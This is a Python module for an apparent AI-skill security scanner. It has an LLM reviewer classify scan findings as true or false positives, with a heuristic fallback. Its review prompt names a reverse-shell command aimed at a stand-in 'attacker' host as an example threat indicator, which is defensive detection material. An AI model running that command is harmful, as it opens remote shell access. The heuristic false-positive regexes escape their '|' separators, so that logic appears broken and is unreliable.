#!/usr/bin/env python3
"""
LLM 二次审查引擎 v6.1 — Multi-Platform Agent Adapter

设计理念：
- 跨平台兼容：支持 OpenClaw、Claude Code、Cursor、Windsurf、QClaw、CoPaw 等
- 插件式架构：按需加载平台适配器
- 自动检测：自动识别当前环境
- 优雅降级：主适配器不可用时自动切换

工作流程：
1. 收集所有静态检测发现
2. 构建审查任务 prompt（包含完整上下文）
3. 通过 Agent Adapter 提交审查任务
4. 获取审查结果并更新风险评分

支持的平台：
- OpenClaw: sessions_spawn API
- Claude Code: claude CLI
- Cursor: cursor CLI
- Windsurf: windsurf CLI
- QClaw: qclaw CLI / API
- CoPaw: copaw CLI / API
"""

import json
import re
import sys
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass

# 尝试导入 Agent Adapter（v6.1 新增）
try:
    from agent_adapter import (
        AgentAdapter,
        AgentAdapterFactory,
        create_adapter,
        get_available_adapters,
        HeuristicAdapter,
    )
    ADAPTER_AVAILABLE = True
except ImportError:
    ADAPTER_AVAILABLE = False


def _p(*args, **kwargs):
    """Progress output to stderr — doesn't interfere with JSON/SARIF stdout."""
    kwargs.setdefault('file', sys.stderr)
    print(*args, **kwargs)


@dataclass
class ReviewResult:
    """单条发现的审查结果"""
    original_finding: Dict
    verdict: str                     # TP / FP / HUMAN_REVIEW
    confidence: float                # 0.0-1.0
    reasoning: str
    true_severity: Optional[str]
    summary: str                     # 一句话中文总结


# ─── Heuristic Fallback (when subagent unavailable) ──────────

class HeuristicReviewer:
    """纯规则启发式审查 — 不依赖任何外部服务"""
    
    @staticmethod
    def _is_negative_example(file_path: Path, line_number: int) -> bool:
        """判断是否是负面示例（告诉用户不要做什么）"""
        try:
            lines = file_path.read_text(encoding='utf-8', errors='ignore').split('\n')
            start = max(0, line_number - 11)
            end = min(len(lines), line_number + 10)
            context = '\n'.join(lines[start:end]).lower()
            
            negative_patterns = [
                r'(?i)never\s+(do|run|execute|install|enable)',
                r'(?i)do\s+not\s+(disable|turn\s*off|remove|bypass|skip)',
                r'(?i)avoid\s+(disabling|turning\s*off|removing)',
                r'(?i)(should|must|will)\s+not\s+(disable|turn\s*off)',
                r'(?i)warning[:\s].*(?:not|never|avoid|don\'t)',
                r'注意[：:]?.*不?要',
                r'禁止',
                r'切勿',
                r'不要',
                r'请勿',
                r'反例',
                r'反面示例',
                r'错误示例',
                r'(?i)bad\s+(example|practice)',
                r'(?i)anti[- ]pattern',
            ]
            
            for pattern in negative_patterns:
                if re.search(pattern, context):
                    return True
            return False
        except Exception:
            return False
    
    @staticmethod
    def review(finding: Dict, target: Path) -> ReviewResult:
        """基于规则的启发式审查 — v6.1 修复激进 FP 分类 (LinkedIn 恶意技能教训)"""
        title = finding.get('title', '').lower()
        desc = finding.get('description', '').lower()
        severity = finding.get('severity', 'INFO')
        
        # CRITICAL/HIGH 必须人工审查，禁止自动 FP 分类
        if severity in ('CRITICAL', 'HIGH'):
            # 例外：安全工具自引用的规则定义
            file_path = str(finding.get('file_path', ''))
            if 'scanner' in file_path.lower() and ('规则定义' in title or 'rule definition' in title.lower()):
                pass  # Continue to FP check
            else:
                return ReviewResult(
                    original_finding=finding,
                    verdict='HUMAN_REVIEW',
                    confidence=0.95,
                    reasoning=f'{severity} 级发现必须人工审查 (LinkedIn 技能教训)',
                    true_severity=severity,
                    summary=f'{severity} 风险 - 需要人工审查'
                )
        
        # FP 指标 (极度严格 - 只放过真正的误报)
        fp_indicators = [
            (r'规则定义\|detection\\s+rule\|扫描器自身', '安全工具规则定义'),
            (r'IOC\|参考数据\|threat.*intel', '威胁情报数据文件'),
            (r'测试\|test.*case\|单元测试', '测试代码'),
        ]
        
        text = f"{title} {desc}"
        for pattern, reason in fp_indicators:
            if re.search(pattern, text, re.IGNORECASE):
                return ReviewResult(
                    original_finding=finding,
                    verdict='FP',
                    confidence=0.7,
                    reasoning=f'确定误报：{reason}',
                    true_severity='INFO',
                    summary=f'误报：{reason}'
                )
        
        # 默认：所有其他发现都需要人工审查
        return ReviewResult(
            original_finding=finding,
            verdict='HUMAN_REVIEW',
            confidence=0.5,
            reasoning='启发式无法确定',
            true_severity=None,
            summary='需要人工审查'
        )

class SubAgentReviewer:
    """
    使用 OpenClaw sessions_spawn 进行 LLM 二次审查。
    
    优势：
    - 不依赖外部 API 配置（idealab/OpenAI 等）
    - 跨平台兼容（Windows/macOS/Linux）
    - 推送式结果通知，无需轮询
    - 自动重试和容错
    """
    
    REVIEW_PROMPT_TEMPLATE = """\
你是一位资深安全工程师，正在审查 AI Agent Skill 的安全扫描结果。

## 技能信息
- 名称: {skill_name}
- 类型: {skill_type}
- 文件数: {file_count}
- 信任分数: {trust_score}/100

## 文件结构
{file_tree}

## 待审查发现 ({count} 条)

{findings_list}

## 你的任务

对每条发现做出判断，返回 JSON 数组，每个元素包含：
{{
  "id": "发现的唯一标识（使用 rule_id 或 title 前缀）",
  "verdict": "TP" | "FP" | "HUMAN_REVIEW",
  "confidence": 0.0-1.0,
  "reasoning": "简短理由（中文，50字以内）",
  "true_severity": "INFO" | "LOW" | "MEDIUM" | "HIGH" | "CRITICAL"（如果与原始不同则修改）
}}

## 常见误报模式
1. 安全工具自身的规则定义 — 扫描器在代码中定义检测模式
2. 参考数据文件 — JSON 列出已知恶意技能名、IOC 域名
3. 安全审计/修复脚本 — 检查弱 token、修复权限的脚本
4. 文档中的关键词 — README/SKILL.md 描述功能时的正常词汇
5. 安全的安装钩子 — postinstall 使用合法包安装器
6. 负面示例/反例 — 文档中"不要做X"的警告说明
7. LLM token 计数 — max_tokens, budget_tokens 等 API 参数
8. 环境变量读取 — os.environ.items(), process.env 等安全操作

## 真实威胁指标
1. 实际的网络外传 — 读取敏感文件 AND 发送到外部 URL
2. 真实的凭证窃取 — 读取 SSH key 并上传
3. 反向 Shell / C2 — 实际执行 bash -i >& /dev/tcp/attacker/port
4. 社会工程 — 伪造密码对话框、钓鱼提示
5. 远程代码执行 — 下载并执行远程脚本

⚠️ IMPORTANT: 只返回 JSON 数组，不要任何其他文本。以 [ 开头，以 ] 结尾。"""

    def __init__(self, target: Path, skill_info: Dict):
        self.target = target
        self.skill_info = skill_info
        self.results: List[ReviewResult] = []
        self.mode = 'subagent'  # 'subagent' | 'heuristic'
    
    def _build_findings_context(self, findings: List[Dict]) -> str:
        """构建带代码上下文的发现列表"""
        sections = []
        for i, finding in enumerate(findings):
            section = f"### 发现 {i+1}\n"
            section += f"- ID: {finding.get('rule_id', finding.get('title', ''))}\n"
            section += f"- 严重度: {finding.get('severity', 'UNKNOWN')}\n"
            section += f"- 标题: {finding.get('title', '')}\n"
            section += f"- 描述: {finding.get('description', '')}\n"
            
            # Add code context if available
            file_path = finding.get('file', '')
            line_num = finding.get('line_number', 0)
            if file_path and line_num > 0:
                fp = Path(file_path) if not isinstance(file_path, Path) else file_path
                if fp.exists():
                    try:
                        lines = fp.read_text(encoding='utf-8', errors='ignore').split('\n')
                        start = max(0, line_num - 8)
                        end = min(len(lines), line_num + 7)
                        context_lines = []
                        for j in range(start, end):
                            marker = '>>> ' if j == line_num - 1 else '    '
                            context_lines.append(f"{marker}{j+1:4d}: {lines[j]}")
                        section += f"- 代码上下文:\n```\n" + "\n".join(context_lines) + "\n```\n"
                    except Exception:
                        pass
            
            sections.append(section)
        
        return "\n".join(sections)
    
    def _build_file_tree(self) -> str:
        """构建技能文件树"""
        if not self.target.is_dir():
            return f"(single file: {self.target.name})"
        
        lines = []
        for fp in sorted(self.target.rglob('*')):
            if not fp.is_file():
                continue
            rel = fp.relative_to(self.target)
            depth = len(rel.parts) - 1
            indent = '  ' * depth
            size = fp.stat().st_size
            lines.append(f"{indent}├── {rel.name} ({size}B)")
        
        return '\n'.join(lines[:50]) + ('\n  ...' if len(lines) > 50 else '')
    
    def build_review_task(self, findings: List[Dict]) -> str:
        """
        构建审查任务 prompt，供 sessions_spawn 使用。
        
        Returns:
            完整的审查任务 prompt 字符串
        """
        file_tree = self._build_file_tree()
        findings_context = self._build_findings_context(findings)
        
        return self.REVIEW_PROMPT_TEMPLATE.format(
            skill_name=self.skill_info.get('name', self.target.name),
            skill_type=self.skill_info.get('type', 'unknown'),
            file_count=self.skill_info.get('file_count', 0),
            trust_score=self.skill_info.get('trust_score', 50),
            file_tree=file_tree,
            count=len(findings),
            findings_list=findings_context,
        )
    
    def _review_via_subagent(self, findings: List[Dict]) -> List[ReviewResult]:
        """Internal: SubAgent-based review via sessions_spawn"""
        """
        通过 sessions_spawn 启动子 Agent 进行审查。
        
        这是推荐的方式 — 利用 OpenClaw 的多 Agent 通信机制。
        需要在 OpenClaw 环境中运行。
        """
        if not findings:
            return []
        
        task_prompt = self.build_review_task(findings)
        
        # Write task to a temp file for the subagent to read
        task_file = self.target.parent / '.scanner_review_task.json'
        task_data = {
            'mode': 'security_review',
            'prompt': task_prompt,
            'findings_count': len(findings),
            'skill_name': self.skill_info.get('name', self.target.name),
        }
        task_file.write_text(json.dumps(task_data, ensure_ascii=False, indent=2), encoding='utf-8')
        
        _p(f"   📋 审查任务已写入: {task_file}")
        _p(f"   🤖 请使用以下命令启动子 Agent 审查:")
        _p(f"      sessions_spawn({{")
        _p(f"          task: '读取 {task_file} 中的审查任务，执行安全审查，将结果写回同一目录的 .scanner_review_result.json',")
        _p(f"          mode: 'run'")
        _p(f"      }})")
        _p("")
        _p(f"   ⚡ 或者直接在当前会话中让 LLM 处理审查任务")
        
        # For now, fall back to heuristic when running outside OpenClaw
        _p(f"\n   ⚡ 子 Agent 模式需要交互式环境，切换到启发式审查")
        return self._review_via_heuristic(findings)
    
    def _review_via_heuristic(self, findings: List[Dict]) -> List[ReviewResult]:
        """Internal: Pure heuristic review (no external dependencies)"""
        """纯启发式审查 — 不依赖任何外部服务"""
        results = []
        for finding in findings:
            result = HeuristicReviewer.review(finding, self.target)
            results.append(result)
        return results
    
    def review(self, findings: List[Dict], use_subagent: bool = True) -> List[ReviewResult]:
        """
        统一入口 — 尝试 subagent，失败则降级到启发式
        
        Args:
            findings: 待审查的发现列表
            use_subagent: 是否尝试使用 subagent 模式
        
        Returns:
            审查结果列表
        """
        if not findings:
            return []
        
        if use_subagent:
            try:
                return self._review_via_subagent(findings)
            except Exception as e:
                _p(f"   ⚠️ SubAgent 审查失败: {e}，降级到启发式")
        
        return self._review_via_heuristic(findings)
    
    def get_summary(self) -> Dict:
        """获取审查摘要"""
        if not self.results:
            return {'total': 0, 'fp': 0, 'tp': 0, 'human_review': 0}

        return {
            'total': len(self.results),
            'fp': sum(1 for r in self.results if r.verdict == 'FP'),
            'tp': sum(1 for r in self.results if r.verdict == 'TP'),
            'human_review': sum(1 for r in self.results if r.verdict == 'HUMAN_REVIEW'),
            'mode': self.mode,
        }


# ─── v6.1 新增：Multi-Platform Agent Adapter ───────────────────────

class MultiPlatformReviewer:
    """
    跨平台 Agent 适配器审查器 (v6.1)

    支持多种 AI Agent 平台：
    - OpenClaw (sessions_spawn)
    - Claude Code (claude CLI)
    - Cursor (cursor CLI)
    - Windsurf (windsurf CLI)
    - QClaw (qclaw CLI/API)
    - CoPaw (copaw CLI/API)

    使用方式：
        reviewer = MultiPlatformReviewer(target, skill_info)
        results = reviewer.review(findings, platform='auto')
    """

    # 支持的平台列表
    SUPPORTED_PLATFORMS = [
        'openclaw', 'claude', 'claude_code', 'cursor', 'windsurf',
        'qclaw', 'copaw', 'github_copilot', 'heuristic', 'auto'
    ]

    def __init__(self, target: Path, skill_info: Dict, config: Optional[Dict] = None):
        self.target = target
        self.skill_info = skill_info
        self.config = config or {}
        self._adapter: Optional[AgentAdapter] = None
        self._current_platform: Optional[str] = None

    def _get_adapter_config(self) -> Dict:
        """获取适配器配置"""
        return {
            'task_dir': self.config.get('task_dir', str(Path.home() / '.openclaw' / 'tasks')),
            'result_dir': self.config.get('result_dir', str(Path.home() / '.openclaw' / 'results')),
            'cli_path': self.config.get('cli_path', ''),
            'api_endpoint': self.config.get('api_endpoint', ''),
        }

    def _build_findings_context(self, findings: List[Dict]) -> str:
        """构建带代码上下文的发现列表"""
        sections = []
        for i, finding in enumerate(findings):
            section = f"### 发现 {i+1}\n"
            section += f"- ID: {finding.get('rule_id', finding.get('title', ''))}\n"
            section += f"- 严重度: {finding.get('severity', 'UNKNOWN')}\n"
            section += f"- 标题: {finding.get('title', '')}\n"
            section += f"- 描述: {finding.get('description', '')}\n"

            file_path = finding.get('file', '')
            line_num = finding.get('line_number', 0)
            if file_path and line_num > 0:
                fp = Path(file_path) if not isinstance(file_path, Path) else file_path
                if fp.exists():
                    try:
                        lines = fp.read_text(encoding='utf-8', errors='ignore').split('\n')
                        start = max(0, line_num - 8)
                        end = min(len(lines), line_num + 7)
                        context_lines = []
                        for j in range(start, end):
                            marker = '>>> ' if j == line_num - 1 else '    '
                            context_lines.append(f"{marker}{j+1:4d}: {lines[j]}")
                        section += f"- 代码上下文:\n```\n" + "\n".join(context_lines) + "\n```\n"
                    except Exception:
                        pass

            sections.append(section)

        return "\n".join(sections)

    def _build_file_tree(self) -> str:
        """构建技能文件树"""
        if not self.target.is_dir():
            return f"(single file: {self.target.name})"

        lines = []
        for fp in sorted(self.target.rglob('*')):
            if not fp.is_file():
                continue
            rel = fp.relative_to(self.target)
            depth = len(rel.parts) - 1
            indent = '  ' * depth
            size = fp.stat().st_size
            lines.append(f"{indent}├── {rel.name} ({size}B)")

        return '\n'.join(lines[:50]) + ('\n  ...' if len(lines) > 50 else '')

    def build_review_prompt(self, findings: List[Dict]) -> str:
        """构建审查任务 prompt"""
        file_tree = self._build_file_tree()
        findings_context = self._build_findings_context(findings)

        template = """\
你是一位资深安全工程师，正在审查 AI Agent Skill 的安全扫描结果。

## 技能信息
- 名称: {skill_name}
- 类型: {skill_type}
- 文件数: {file_count}
- 信任分数: {trust_score}/100

## 文件结构
{file_tree}

## 待审查发现 ({count} 条)

{findings_list}

## 你的任务

对每条发现做出判断，返回 JSON 数组，每个元素包含：
{{
  "id": "发现的唯一标识（使用 rule_id 或 title 前缀）",
  "verdict": "TP" | "FP" | "HUMAN_REVIEW",
  "confidence": 0.0-1.0,
  "reasoning": "简短理由（中文，50字以内）",
  "true_severity": "INFO" | "LOW" | "MEDIUM" | "HIGH" | "CRITICAL"（如果与原始不同则修改）
}}

## 常见误报模式
1. 安全工具自身的规则定义
2. 参考数据文件（JSON 列出已知恶意技能名）
3. 安全审计/修复脚本
4. 文档中的关键词
5. 安全的安装钩子
6. 负面示例/反例
7. LLM token 计数参数
8. 环境变量读取

## 真实威胁指标
1. 实际的网络外传
2. 真实的凭证窃取
3. 反向 Shell / C2
4. 社会工程
5. 远程代码执行

⚠️ IMPORTANT: 只返回 JSON 数组，不要任何其他文本。以 [ 开头，以 ] 结尾。"""

        return template.format(
            skill_name=self.skill_info.get('name', self.target.name),
            skill_type=self.skill_info.get('type', 'unknown'),
            file_count=self.skill_info.get('file_count', 0),
            trust_score=self.skill_info.get('trust_score', 50),
            file_tree=file_tree,
            count=len(findings),
            findings_list=findings_context,
        )

    def get_available_platforms(self) -> List[Dict]:
        """获取可用平台列表"""
        if not ADAPTER_AVAILABLE:
            return [{'platform': 'heuristic', 'available': True, 'priority': 999}]

        try:
            adapters = get_available_adapters(self._get_adapter_config())
            return [
                {'platform': a.platform, 'available': a.available, 'priority': a.priority, 'error': a.error}
                for a in adapters
            ]
        except Exception as e:
            _p(f"   ⚠️ 获取可用平台失败: {e}")
            return [{'platform': 'heuristic', 'available': True, 'priority': 999}]

    def review(self, findings: List[Dict], platform: str = 'auto', timeout: int = 60) -> List[ReviewResult]:
        """
        跨平台审查入口

        Args:
            findings: 待审查的发现列表
            platform: 指定平台 ('auto', 'openclaw', 'claude', 'cursor', 'qclaw', 'heuristic')
            timeout: 超时时间（秒）

        Returns:
            审查结果列表
        """
        if not findings:
            return []

        # 检查适配器是否可用
        if not ADAPTER_AVAILABLE:
            _p("   ⚠️ Agent Adapter 不可用，使用原有启发式审查")
            return self._review_via_heuristic(findings)

        try:
            # 创建适配器
            self._adapter = create_adapter(platform, self._get_adapter_config())
            self._current_platform = self._adapter.name

            if not self._adapter.is_available():
                _p(f"   ⚠️ 平台 '{self._current_platform}' 不可用，切换到启发式审查")
                return self._review_via_heuristic(findings)

            # 构建 prompt
            prompt = self.build_review_prompt(findings)
            context = {
                'skill_name': self.skill_info.get('name', self.target.name),
                'skill_type': self.skill_info.get('type', 'unknown'),
                'findings_count': len(findings),
                'trust_score': self.skill_info.get('trust_score', 50),
            }

            # 提交任务
            _p(f"   🔄 提交审查任务到平台: {self._current_platform}")
            task_id = self._adapter.submit_review_task(prompt, context)

            # 获取结果
            adapter_results = self._adapter.get_review_result(task_id, timeout)

            # 转换结果格式
            results = []
            for ar in adapter_results:
                # 匹配原始发现
                original = None
                for f in findings:
                    if f.get('rule_id', '').startswith(ar.finding_id) or ar.finding_id in f.get('title', ''):
                        original = f
                        break

                results.append(ReviewResult(
                    original_finding=original or {},
                    verdict=ar.verdict,
                    confidence=ar.confidence,
                    reasoning=ar.reasoning,
                    true_severity=ar.true_severity,
                    summary=ar.summary or ar.reasoning
                ))

            _p(f"   ✅ 平台 {self._current_platform} 审查完成: {len(results)} 条结果")
            return results

        except Exception as e:
            _p(f"   ⚠️ 平台审查失败: {e}，降级到启发式")
            return self._review_via_heuristic(findings)
        finally:
            if self._adapter:
                self._adapter.close()
                self._adapter = None

    def _review_via_heuristic(self, findings: List[Dict]) -> List[ReviewResult]:
        """降级到启发式审查"""
        results = []
        for finding in findings:
            result = HeuristicReviewer.review(finding, self.target)
            results.append(result)
        return results

    def get_current_platform(self) -> Optional[str]:
        """获取当前使用的平台"""
        return self._current_platform


# 便捷函数
def create_reviewer(target: Path, skill_info: Dict, use_adapter: bool = True, **kwargs) -> 'SubAgentReviewer':
    """
    创建审查器的便捷函数

    Args:
        target: 技能路径
        skill_info: 技能信息
        use_adapter: 是否使用新的 Adapter 模式
        **kwargs: 其他配置

    Returns:
        审查器实例
    """
    if use_adapter and ADAPTER_AVAILABLE:
        return MultiPlatformReviewer(target, skill_info, kwargs)
    return SubAgentReviewer(target, skill_info)
